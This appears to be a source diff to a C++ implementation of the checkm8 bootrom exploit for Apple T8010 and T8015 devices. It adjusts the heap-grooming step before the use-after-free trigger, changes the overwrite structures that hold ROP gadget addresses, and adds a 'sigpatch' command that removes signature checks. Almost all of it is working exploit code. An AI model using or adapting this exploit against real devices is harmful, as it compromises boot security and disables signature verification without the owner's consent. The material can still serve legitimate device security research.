@@ -25,6 +25,7 @@ using namespace tihmstar::img4tool;
 #include "aes.hpp"
 #include "dfu.h"
 #include "usbexec.h"
+#include "rmsigchecks.h"
 
 typedef vector<uint8_t> V8;
 
@@ -37,7 +38,8 @@ enum class ECOMMAND
   READ_U64,
   DECRYPT_IMG4,
   HEXDUMP,
-  DUMPROM
+  DUMPROM,
+  SIGPATCH
 };
 
 const int PAYLOAD_OFFSET_ARMV7 = 384;
@@ -52,13 +54,14 @@ typedef struct _DeviceConfig
   int large_leak;
   uint8_t *overwrite;
   int overwrite_size;
+  int overwrite_offset;
   int hole;
   int leak;
 
   _DeviceConfig(std::string version, int cpid, int large_leak,
-                uint8_t *overwrite, int overwrite_size, int hole, int leak)
+                uint8_t *overwrite, int overwrite_size, int overwrite_offset, int hole, int leak)
       : version(version), cpid(cpid), large_leak(large_leak),
-        overwrite(overwrite), overwrite_size(overwrite_size), hole(hole),
+        overwrite(overwrite), overwrite_size(overwrite_size), overwrite_offset(overwrite_offset), hole(hole),
         leak(leak) {}
 } DeviceConfig;
 
@@ -578,7 +581,7 @@ vector<uint8_t> getT8015Shellcode()
 #pragma pack(1)
 typedef struct alignas(1)
 {
-  uint8_t temp0[0x580] = {0};
+  // uint8_t temp0[0x580] = {0};
   uint8_t temp1[32] = {0};
   uint64_t t8010_nop_gadget0 = 0x10000CC6C;
   uint64_t Offset = 0x1800B0800;
@@ -591,7 +594,7 @@ typedef struct alignas(1)
 #pragma pack(1)
 typedef struct alignas(1)
 {
-  uint8_t temp0[0x500] = {0};
+  // uint8_t temp0[0x500] = {0};
   uint8_t temp1[32] = {0};
   uint64_t t8015_nop_gadget0 = 0x10000A9C4;
   uint64_t Offset = 0x18001C020;
@@ -646,6 +649,12 @@ void checkm8(DeviceConfig config)
   std::vector<uint8_t> A800;
   A800.insert(A800.end(), 0x800, 'A');
   D.libusb1_async_ctrl_transfer(0x21, 1, 0, 0, A800, 0.0001);
+
+  // Advance buffer offset before triggering the UaF to prevent trashing the heap (credit LinusHenze)
+  std::vector<uint8_t> A_ADVANCE;
+  A_ADVANCE.insert(A_ADVANCE.end(), config.overwrite_offset, 'A');
+  D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, A_ADVANCE.data(), config.overwrite_offset, 10);
+
   // libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
   D.libusb1_no_error_ctrl_transfer(0x21, 4, 0, 0, 0, 0, 0);
   D.release_device();
@@ -660,6 +669,7 @@ void checkm8(DeviceConfig config)
   {
     D.usb_req_leak();
   }
+
   D.libusb1_no_error_ctrl_transfer(0, 0, 0, 0, config.overwrite,
                                    config.overwrite_size, 100);
 
@@ -805,12 +815,12 @@ void runCheckm8()
       // Create device config
       t8015_overwrite Overwrite;
       checkm8(DeviceConfig("iBoot-3332.0.0.1.23", 0x8015, 0, (uint8_t *)&Overwrite,
-                        sizeof(Overwrite), 6, 1));
+                        sizeof(Overwrite), 0x500, 6, 1));
     } else if (serial.find("CPID:8010") != string::npos) {
       // Create device config
       t8010_overwrite Overwrite;
       checkm8(DeviceConfig("iBoot-2696.0.0.1.33", 0x8010, 0, (uint8_t *)&Overwrite,
-                        sizeof(Overwrite), 5, 1));
+                        sizeof(Overwrite), 0x580, 5, 1));
     }
 
   }
@@ -1192,6 +1202,10 @@ ECOMMAND parseCommandLine(int argc, char *argv[])
   {
     return ECOMMAND::DUMPROM;
   }
+  else if (Command == "sigpatch")
+  {
+    return ECOMMAND::SIGPATCH;
+  }
 
   cout << "[!] Unknown command!\n";
 
@@ -1246,6 +1260,11 @@ int main(int argc, char *argv[])
   case ECOMMAND::DUMPROM:
   {
     dumprom();
+  }
+  break;
+  case ECOMMAND::SIGPATCH:
+  {
+    remove_sigchecks();
   }
   break;
   default:
